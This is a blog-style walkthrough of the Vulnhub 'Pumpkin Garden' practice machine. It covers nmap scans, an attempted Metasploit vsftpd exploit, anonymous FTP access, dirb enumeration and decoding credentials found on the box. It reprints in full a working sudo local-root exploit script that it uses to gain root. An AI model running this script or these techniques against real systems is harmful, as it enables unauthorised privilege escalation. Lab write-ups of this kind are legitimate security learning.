---
layout: post
title:  "Breaking Into The Pumpkin Garden"
excerpt: "Cracking the pumpkin garden virtual box"
date: 2019-12-20 02:15:20 -0500
---
&nbsp;&nbsp;&nbsp;&nbsp;Today I'm taking a crack at breaking into the [Pumpkin Garden Vulnhub image](https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/#description), an introductory level virtual machine for CTFs.
 Where this post does eventually arrive at a solution, it is an explanation of the process so I can find points of improvement.
 Points where I cheat, I document, but I intend to learn those tools as I move forward with future images.


&nbsp;&nbsp;&nbsp;&nbsp;According to description my goal is to get the `PumpkinGarden_key` on the root account.
 The machine says I'm running on 192.168.1.185.
 Running nmap on that I get...

```
 nmap -A 192.168.1.185                                                                             [00:17:35]
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-20 00:17 CST
Nmap scan report for Pumpkin (192.168.1.185)
Host is up (0.000073s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
```

&nbsp;&nbsp;&nbsp;&nbsp;Last time I pentested something I used metasploit, so I'm trying that again.
 [exploitdb](https://www.exploit-db.com/exploits/17491) does not have a remote execution vulnerability for 2.0.8, but there is one for 2.3.4.
 I don't know if I can leverage that, might as well try.

```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.1.185
RHOST => 192.168.1.185
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.1.185    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.1.185:21 - Banner: 220 Welcome to Pumpkin's FTP service.
[*] 192.168.1.185:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

&nbsp;&nbsp;&nbsp;&nbsp;That didn't work, maybe I can try hitting other open ports.

```
nmap -p- -A 192.168.1.185                                                                                   [00:32:26]
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-20 00:32 CST
Nmap scan report for Pumpkin (192.168.1.185)
Host is up (0.000073s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Mission-Pumpkin
3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d8:8d:e7:48:3a:3c:91:0e:3f:43:ea:a3:05:d8:89:e2 (DSA)
|   2048 f0:41:8f:e0:40:e3:c0:3a:1f:4d:4f:93:e6:63:24:9e (RSA)
|   256 fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1 (ECDSA)
|_  256 fa:e8:42:5a:88:91:b4:4b:eb:e4:c3:74:2e:23:a5:45 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
```

&nbsp;&nbsp;&nbsp;&nbsp;Maybe there is a front door approach.
 Maybe the ftp service has default credentials.
 According  to [Microsoft's documentation on anonymous authentication over ftp](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/ftpserver/security/authentication/anonymousauthentication) anonymous ftp uses the username anonymous and either an empty password or anonymous as the password. 
 I'll try that.

```
ftp 192.168.1.185                                                                                           [20:04:22]
Connected to 192.168.1.185.
220 Welcome to Pumpkin's FTP service.
Name (192.168.1.185:ragnyll): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

&nbsp;&nbsp;&nbsp;&nbsp;Well that did the trick.

```
cat note.txt                                                                                                [20:13:11]
Hello Dear! 
Looking for route map to PumpkinGarden? I think jack can help you find it.
```

&nbsp;&nbsp;&nbsp;&nbsp;Dunno who Jack is, is but maybe his user is unprotected.
 I'll note that down and try to check around for other basic stuff right now.
 Lets checkout the http server.

&nbsp;&nbsp;&nbsp;&nbsp;http://192.168.1.185:1515/ has a picture of a cat and says that they have a route map under the hood.
 Maybe theres something in the source code of this page. There's a comment that says:

```
 searching for the route map? Pumpkin images may help you find the way
```

&nbsp;&nbsp;&nbsp;&nbsp;So maybe there is a hint in the image.


&nbsp;&nbsp;&nbsp;&nbsp;I'm not gonna lie on this part.
 I don't really know many tools and I'll just cheat a bit to get through this one so I know what to go after next.
 I'll read the docs after the fact. 
 I just tried to get the name of the tool to use and not look at any extra stuff...

&nbsp;&nbsp;&nbsp;&nbsp;Apparently next tool people use is `dirb` which scans web content on http servers by using a dictionary attack.
 I'll ty that with the common word list file on [the kali documentation example lists](https://tools.kali.org/web-applications/dirb).
 The dirb repo has [many wordlists](https://github.com/v0re/dirb/tree/master/wordlists) including the common one.
 Running dirb comes back with 3 urls:

```
dirb http://192.168.1.185:1515/ common.txt                                                                  [21:13:43]

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec 20 21:13:43 2019
URL_BASE: http://192.168.1.185:1515/
WORDLIST_FILES: common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.185:1515/ ----
==> DIRECTORY: http://192.168.1.185:1515/img/                                                                            
+ http://192.168.1.185:1515/index.html (CODE:200|SIZE:903)                                                               
+ http://192.168.1.185:1515/server-status (CODE:403|SIZE:295)                                                            
                                                                                                                         
---- Entering directory: http://192.168.1.185:1515/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Dec 20 21:13:44 2019
DOWNLOADED: 4612 - FOUND: 2
```

I'm going to take a look at those

The cat asked me to look at pumpkins (just like in that comment earlier), and theres also hidden secret which looks promising.


and there is a clue in the hidden folder. 

```
c2NhcmVjcm93IDogNVFuQCR5
```

&nbsp;&nbsp;&nbsp;&nbsp;Could be a password, could be an encoded string.
 Lets try decoding it using base64.

```
scarecrow : 5Qn@$y
```

&nbsp;&nbsp;&nbsp;&nbsp;That may be a user password set.
 Lets try that on the ftp server
 ... that did the trick, in the directory theres another note.

```
Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)!
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
```

&nbsp;&nbsp;&nbsp;&nbsp;Ok, so know i know that LordPumpkin is the root user, and there is likely another user named goblin.
 I can try to log in to the ftp server with that key, but I doubt thats the password.
 …
 lol I actually can log into goblin with those creds. In goblins home directory there another note...

```
Hello Friend! I heard that you are looking for PumpkinGarden key. 
But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
You can reach there through my backyard.

Here is the key to my backyard
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
```

&nbsp;&nbsp;&nbsp;&nbsp;I checked the domain and it seems legit so buuuut that script isn't up anymore.

&nbsp;&nbsp;&nbsp;&nbsp;Shit.

&nbsp;&nbsp;&nbsp;&nbsp;This seems like an acceptable time to cheat.
 The file I need to complete the exercise doesn't exist, so I just grabbed it from someone's [walkthrough](https://www.hackingarticles.in/pumpkingarden-vulnhub-walkthrough/). 

```
#!/bin/sh
# Tod Miller Sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4
# local root exploit
# March 2010
# automated by kingcope
# Full Credits to Slouching
echo Tod Miller Sudo local root exploit
echo by Slouching
echo automated by kingcope
if [ $# != 1 ]
then
echo “usage: ./sudoxpl.sh <file you have permission to edit>”
exit
fi
cd /tmp
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit
sudo ./sudoedit $1
```

Lets try to log into the goblin user that I have using the password from earlier.

```
ssh goblin@192.168.1.185 -p 3535
```


&nbsp;&nbsp;&nbsp;&nbsp;But if I copy the script up its gone in like 5 sec... wtf? It looks like something is deleting it.

```
ps -ef | grep rm

root      1505  1498  0 12:11 ?        00:00:00 /bin/sh -c sleep 30; rm /home/goblin/*.*
```

&nbsp;&nbsp;&nbsp;&nbsp;That little goblin fucker has something thats deleting my shit every 30sec.

&nbsp;&nbsp;&nbsp;&nbsp;Unfortunately scarecow is not sudo, so I cant run it, but goblin has sudo, so I could run the file from scarecrow using sudo from goblins account.

```
goblin@Pumpkin:~$ sudo /home/scarecrow/script.sh file.txt     
[sudo] password for goblin: 
Tod Miller Sudo local root exploit
by Slouching
automated by kingcope
ALEX-ALEX
root@Pumpkin:/tmp#
```

&nbsp;&nbsp;&nbsp;&nbsp;Aaaand I'm root, and in the root users direcotry we have the Pumpkin garden key.

```
cd ~
ls
»PumpkinGaden_Key
```

&nbsp;&nbsp;&nbsp;&nbsp;The contents look to be encoded again, so using base64 decode…

```
root@Pumpkin:~# cat PumpkinGarden_Key | base64 -d
Congratulations!root@Pumpkin:~#
```

Cool I've go the key and I've completed the image.

## Conclusions
&nbsp;&nbsp;&nbsp;&nbsp;`dirb` is pretty cool, so I need to learn it and other dictionary based attacks.
 I also need to just poke my nose everywhere that looks interesting, checking default creds I usually think about, but that should always be thought number one.
